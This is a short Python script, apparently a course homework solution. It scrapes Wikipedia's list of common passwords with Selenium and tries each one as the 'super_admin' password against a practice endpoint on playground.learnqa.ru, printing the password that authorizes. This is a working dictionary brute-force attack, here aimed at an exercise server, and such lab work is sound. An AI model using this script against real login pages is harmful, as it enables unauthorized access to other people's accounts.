import requests
from selenium import webdriver
from selenium.webdriver.common.by import By

driver = webdriver.Chrome()
driver.get('https://en.wikipedia.org/wiki/List_of_the_most_common_passwords')
driver.maximize_window()
driver.execute_script("window.scrollBy(0,1300)","")
elements = driver.find_elements(
    By.XPATH,"//*[@id=\"mw-content-text\"]/div[1]/table[2]/tbody/tr/td")
passwords = [i.text for i in elements]

driver.close()

URL_ONE = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
URL_TWO = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

for i in passwords:
    data = {
        'login': "super_admin",
        'password': i
    }
    cookie = dict(requests.post(URL_ONE, data=data).cookies)
    new_response = requests.post(URL_TWO, data=cookie).text
    if new_response == 'You are authorized':
        print(f"{i} You are authorized")


